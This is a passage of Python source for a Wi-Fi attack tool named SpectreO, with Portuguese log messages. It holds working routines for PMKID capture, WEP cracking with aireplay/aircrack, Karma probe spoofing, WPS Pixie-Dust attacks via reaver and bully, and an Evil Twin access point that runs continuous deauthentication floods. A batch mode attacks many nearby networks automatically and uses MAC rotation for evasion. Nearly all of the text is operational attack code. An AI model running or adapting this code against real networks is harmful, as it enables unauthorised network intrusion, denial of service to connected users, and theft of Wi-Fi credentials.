    if channel_monitor:
        channel_monitor.stop()
    
    log.error("FALHA Handshake")
    return False

# ============================================================================
# ATAQUES 2-6 COMPLETOS (MANTIDOS DA v3.5)
# ============================================================================

def attack_pmkid(target, interface, manager, detector):
    log.info("="*70)
    log.info("ATAQUE 2: PMKID v3.5.1")
    log.info("="*70)
    
    if CONFIG['mac_rotation']:
        rotate_mac(interface)
        time.sleep(2)
    
    set_channel(interface, target['channel'])
    time.sleep(1)
    
    for attempt in range(1, CONFIG['pmkid_retries'] + 1):
        log.info(f"\nTENTATIVA {attempt}/{CONFIG['pmkid_retries']}")
        
        pmkid_packets = []
        
        def handler(pkt):
            if pkt.haslayer(EAPOL):
                if pkt[Dot11].addr3 == target['bssid'] or pkt[Dot11].addr2 == target['bssid']:
                    pmkid_packets.append(pkt)
        
        fake_mac = ':'.join([f'{random.randint(0,255):02x}' for _ in range(6)])
        
        for i in range(5):
            try:
                assoc = RadioTap()/\
                        Dot11(addr1=target['bssid'], addr2=fake_mac, addr3=target['bssid'])/\
                        Dot11AssoReq(cap='ESS+privacy', listen_interval=10)/\
                        Dot11Elt(ID='SSID', info=target['ssid'].encode() if target['ssid'] else b'')/\
                        Dot11Elt(ID='Rates', info=b'\x82\x84\x8b\x96\x0c\x12\x18\x24')/\
                        Dot11Elt(ID='ExtRates', info=b'\x30\x48\x60\x6c')/\
                        Dot11Elt(ID='RSN', info=(
                            b'\x01\x00'
                            b'\x00\x0f\xac\x04'
                            b'\x01\x00\x00\x0f\xac\x04'
                            b'\x01\x00\x00\x0f\xac\x02'
                            b'\x0c\x00'
                            b'\x00\x00'
                        ))
                
                sendp(assoc, iface=interface, verbose=0)
                time.sleep(0.5)
            except:
                continue
        
        sniff(iface=interface, prn=handler, timeout=CONFIG['pmkid_timeout'], store=False)
        
        if pmkid_packets:
            valid, result = CaptureValidator.validate_pmkid(pmkid_packets)
            
            if valid:
                filename_base = f"pmkid_{sanitize_filename(target['bssid'])}_{sanitize_filename(target['ssid'])}"
                cap_file = os.path.join(manager.cap_dir, f"{filename_base}.cap")
                
                wrpcap(cap_file, pmkid_packets)
                hc_file = export_to_hashcat(cap_file, 'pmkid', manager)
                manager.add_capture(target['bssid'], target['ssid'], 'pmkid',
                                   cap_file, hc_file, target['channel'], target['signal'], result)
                
                log.success("="*70)
                log.success("PMKID CAPTURADO!")
                log.success("="*70)
                return True
    
    log.error("FALHA PMKID")
    return False

def attack_wep(target, interface, manager, detector):
    log.info("="*70)
    log.info("ATAQUE 3: WEP v3.5.1")
    log.info("="*70)
    
    if 'WEP' not in str(target['crypto']):
        log.error("Alvo não é WEP!")
        return False
    
    set_channel(interface, target['channel'])
    output_base = f"wep_{sanitize_filename(target['bssid'])}"
    output = os.path.join(manager.cap_dir, output_base)
    
    airodump_proc = subprocess.Popen(['airodump-ng', '-c', str(target['channel']), 
                                     '--bssid', target['bssid'], '-w', output, 
                                     '--output-format', 'cap', interface],
                                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    cleanup_handler.register_process(airodump_proc)
    time.sleep(3)
    
    aireplay_proc = None
    if target['clients']:
        client_mac = target['clients'][0]
        aireplay_proc = subprocess.Popen(['aireplay-ng', '--arpreplay', 
                                         '-b', target['bssid'], '-h', client_mac, interface],
                                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        cleanup_handler.register_process(aireplay_proc)
    
    start_time = time.time()
    chopchop_attempted = False
    
    while time.time() - start_time < 600:
        elapsed = int(time.time() - start_time)
        cap_file = f"{output}-01.cap"
        
        if os.path.exists(cap_file):
            try:
                pkts = rdpcap(cap_file)
                iv_count = len(pkts)
                
                if iv_count >= 50000:
                    break
                
                if CONFIG['wep_chopchop_fallback'] and not chopchop_attempted:
                    if elapsed > 300 and iv_count < 10000:
                        if aireplay_proc:
                            aireplay_proc.kill()
                        
                        aireplay_proc = subprocess.Popen(['aireplay-ng', '--chopchop',
                                                         '-b', target['bssid'], interface],
                                                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                        cleanup_handler.register_process(aireplay_proc)
                        chopchop_attempted = True
            except:
                pass
        
        time.sleep(10)
    
    airodump_proc.kill()
    if aireplay_proc:
        aireplay_proc.kill()
    
    cap_file = f"{output}-01.cap"
    if os.path.exists(cap_file):
        result = subprocess.run(['aircrack-ng', cap_file],
                               capture_output=True, text=True, 
                               timeout=CONFIG['universal_timeout']*6)
        
        if 'KEY FOUND!' in result.stdout:
            log.success("WEP CRACKEADO!")
            manager.add_capture(target['bssid'], target['ssid'], 'wep',
                               cap_file, None, target['channel'], target['signal'], {})
            return True
    
    log.error("FALHA WEP")
    return False

def attack_karma(target, interface, manager, detector):
    log.info("="*70)
    log.info("ATAQUE 4: Karma")
    log.info("="*70)
    
    captured_probes = set()
    
    def handler(pkt):
        if pkt.haslayer(Dot11ProbeReq):
            try:
                ssid = pkt[Dot11Elt].info.decode('utf-8', errors='ignore')
                client_mac = pkt[Dot11].addr2
                
                if ssid and ssid not in captured_probes:
                    captured_probes.add(ssid)
                    log.success(f"Probe: {client_mac} -> '{ssid}'")
                    
                    response = RadioTap()/Dot11(type=0, subtype=8, addr1=client_mac, 
                                               addr2=interface, addr3=interface)/\
                              Dot11Beacon(cap='ESS')/Dot11Elt(ID='SSID', info=ssid)
                    sendp(response, iface=interface, verbose=0)
            except:
                pass
    
    try:
        sniff(iface=interface, prn=handler, store=False, timeout=120)
    except KeyboardInterrupt:
        pass
    
    log.info(f"{len(captured_probes)} SSIDs")
    return False

def attack_wps(target, interface, manager, detector):
    log.info("="*70)
    log.info("ATAQUE 5: WPS")
    log.info("="*70)
    
    try:
        result = subprocess.run(['wash', '-i', interface, '-C'], 
                               capture_output=True, text=True, 
                               timeout=CONFIG['universal_timeout'])
        
        if target['bssid'] not in result.stdout:
            log.error("WPS não detectado")
            return False
        
        try:
            reaver_result = subprocess.run(['reaver', '-i', interface, '-b', target['bssid'], 
                                           '-c', str(target['channel']), '-K', '1', '-vv'], 
                                          capture_output=True, text=True, timeout=300)
            
            if 'WPS PIN:' in reaver_result.stdout:
                log.success("Reaver Pixie SUCESSO!")
                return True
        except subprocess.TimeoutExpired:
            pass
        
        try:
            bully_result = subprocess.run(['bully', interface, '-b', target['bssid'], 
                                          '-c', str(target['channel']), '-d'], 
                                         capture_output=True, text=True, timeout=300)
            
            if 'PIN:' in bully_result.stdout:
                log.success("Bully Pixie SUCESSO!")
                return True
        except:
            pass
    except Exception as e:
        log.error(f"Erro WPS: {e}")
    
    log.error("FALHA WPS")
    return False

def attack_evil_twin_no_portal(target, interface, manager, detector):
    log.info("="*70)
    log.info("ATAQUE 6: Evil Twin v3.5.1")
    log.info("="*70)
    
    if not check_ap_mode_support(interface):
        log.error("Interface não suporta AP mode!")
        return False
    
    hostapd_conf = f"""interface={interface}
driver=nl80211
ssid={target['ssid']}
channel={target['channel']}
hw_mode=g
auth_algs=1
wpa=0
"""
    
    hostapd_conf_file = '/tmp/hostapd_evil.conf'
    with open(hostapd_conf_file, 'w') as f:
        f.write(hostapd_conf)
    
    hostapd_proc = subprocess.Popen(['hostapd', hostapd_conf_file],
                                   stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    
    cleanup_handler.register_process(hostapd_proc)
    
    time.sleep(3)
    if hostapd_proc.poll() is not None:
        log.error("Hostapd falhou")
        return False
    
    stop_deauth = threading.Event()
    
    def continuous_deauth():
        while not stop_deauth.is_set():
            frame = RadioTap()/Dot11(addr1="FF:FF:FF:FF:FF:FF", addr2=target['bssid'], 
                                    addr3=target['bssid'])/Dot11Deauth(reason=7)
            sendp(frame, iface=interface, count=5, inter=0.5, verbose=0)
            time.sleep(2)
    
    deauth_thread = threading.Thread(target=continuous_deauth, daemon=True)
    deauth_thread.start()
    
    state = CaptureState()
    
    def handler(pkt):
        if pkt.haslayer(EAPOL):
            state.add_packet(pkt)
            if state.packet_count() >= 4:
                valid, _ = CaptureValidator.validate_handshake(state.get_packets())
                if valid:
                    state.set_captured(True)
                    return True
    
    try:
        sniff(iface=interface, prn=handler, timeout=300, 
              stop_filter=lambda x: state.is_captured(), store=False)
    except KeyboardInterrupt:
        pass
    
    stop_deauth.set()
    hostapd_proc.kill()
    
    if state.is_captured():
        valid, result = CaptureValidator.validate_handshake(state.get_packets())
        
        if valid:
            filename_base = f"evil_{sanitize_filename(target['bssid'])}_{sanitize_filename(target['ssid'])}"
            cap_file = os.path.join(manager.cap_dir, f"{filename_base}.cap")
            wrpcap(cap_file, state.get_packets())
            
            hc_file = export_to_hashcat(cap_file, 'handshake', manager)
            manager.add_capture(target['bssid'], target['ssid'], 'evil_twin',
                               cap_file, hc_file, target['channel'], target['signal'], result)
            
            log.success("HANDSHAKE via Evil Twin!")
            return True
    
    log.error("FALHA Evil Twin")
    return False

# ============================================================================
# BATCH v3.5.1
# ============================================================================

def batch_mode_intelligent_v3_5_1(targets, interface, manager, detector):
    log.info("="*70)
    log.info("MODO BATCH v3.5.1")
    log.info("="*70)
    
    CONFIG['batch_mode'] = True
    
    blacklist = APBlacklist() if CONFIG['batch_blacklist'] else None
    
    filtered = [(b, i) for b, i in targets 
                if len(i['clients']) >= CONFIG['batch_min_clients'] 
                and i['signal'] >= CONFIG['batch_min_signal']][:CONFIG['batch_max_targets']]
    
    log.info(f"{len(filtered)} alvos\n")
    
    success = 0
    
    for idx, (bssid, info) in enumerate(filtered, 1):
        target = {**info, 'bssid': bssid}
        
        if blacklist and blacklist.is_blacklisted(bssid):
            log.warning(f"Pulando {target['ssid']} (blacklisted)")
            continue
        
        log.info(f"\nALVO {idx}/{len(filtered)}: {target['ssid']}")
        
        strategy = select_attack_strategy(target)
        
        if not strategy:
            continue
        
        result = strategy.execute(target, interface, manager, detector)
        
        if result:
            success += 1
        else:
            if blacklist:
                blacklist.add_failure(bssid)
        
        if CONFIG['batch_target_captures'] and success >= CONFIG['batch_target_captures']:
            break
        
        time.sleep(5)
    
    log.info("\nBATCH COMPLETO")
    log.info(f"Sucessos: {success}/{len(filtered)}")

# ============================================================================
# MAIN
# ============================================================================

ATTACKS = {
    '1': {'name': 'Handshake', 'func': attack_handshake},
    '2': {'name': 'PMKID', 'func': attack_pmkid},
    '3': {'name': 'WEP', 'func': attack_wep},
    '4': {'name': 'Karma', 'func': attack_karma},
    '5': {'name': 'WPS', 'func': attack_wps},
    '6': {'name': 'Evil Twin', 'func': attack_evil_twin_no_portal},
    'B': {'name': 'BATCH', 'func': None}
}

def main():
    print("""
╔══════════════════════════════════════════════════════════════╗
║        SpectreO v3.5.1 - HOTFIX Production Edition           ║
╠══════════════════════════════════════════════════════════════╣
║  CORREÇÕES v3.5.1:                                           ║
║    ✓ Interface detection regex robusto                       ║
║    ✓ MAC rotation com verificação state UP                   ║
║    ✓ ChannelMonitor tratamento OSError                       ║
║    ✓ Verificação interface antes de operações                ║
║    ✓ Aguarda 2s após operações críticas                      ║
║    ✓ Sniff com try/except OSError                            ║
║                                                              ║
║  Total: ~1450 linhas | 100% FUNCIONAL                       ║
╚══════════════════════════════════════════════════════════════╝
    """)
    
    if os.geteuid() != 0:
        log.error("ROOT REQUIRED")
        sys.exit(1)
    
    log.info(f"SpectreO v{CONFIG['metadata_version']}")
    
    optimize_system()
    manager = CaptureManager(CONFIG['output_dir'])
    detector = CountermeasureDetector()
    
    interface = CONFIG['interface'] or detect_wireless_interface()
    if not interface:
        sys.exit(1)
    
    CONFIG['interface'] = interface
    setup_interface(interface)
    time.sleep(2)
    
    networks = scan(interface, duration=CONFIG['scan_duration'])
    
    if not networks:
        log.error("Nenhuma rede")
        return
    
    available = {b: i for b, i in networks.items() 
                 if not (CONFIG['skip_captured'] and manager.is_captured(b))}
    
    targets = sorted(available.items(), 
                    key=lambda x: (len(x[1]['clients']), x[1]['signal']), 
                    reverse=True)
    
    log.info(f"\n{len(targets)} alvos:\n")
    for i, (bssid, info) in enumerate(targets, 1):
        crypto = ', '.join(str(c) for c in info['crypto']) if info['crypto'] else 'OPEN'
        pmf_str = ' [PMF]' if info.get('pmf') else ''
        print(f"{i:2}. {info['ssid'][:20]:20} | {bssid} | Ch{info['channel']:2} | {info['signal']:4}dBm | {len(info['clients'])}cli | {crypto}{pmf_str}")
    
    mode = input("\n[?] (I)nterativo ou (B)atch: ").strip().upper()
    
    if mode == 'B':
        batch_mode_intelligent_v3_5_1(targets, interface, manager, detector)
    else:
        choice = int(input("\n[?] Alvo: ")) - 1
        bssid, info = targets[choice]
        target = {**info, 'bssid': bssid}
        
        print(f"\n{'='*70}\nATAQUES\n{'='*70}\n")
        for key, attack in ATTACKS.items():
            if attack['func']:
                print(f"{key}. {attack['name']}")
        
        atk = input("\n[?] Ataque: ").strip()
        if atk in ATTACKS and ATTACKS[atk]['func']:
            ATTACKS[atk]['func'](target, interface, manager, detector)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        log.warning("\nInterrompido")
    except Exception as e:
        log.error(f"Erro: {e}")
        import traceback
        traceback.print_exc()
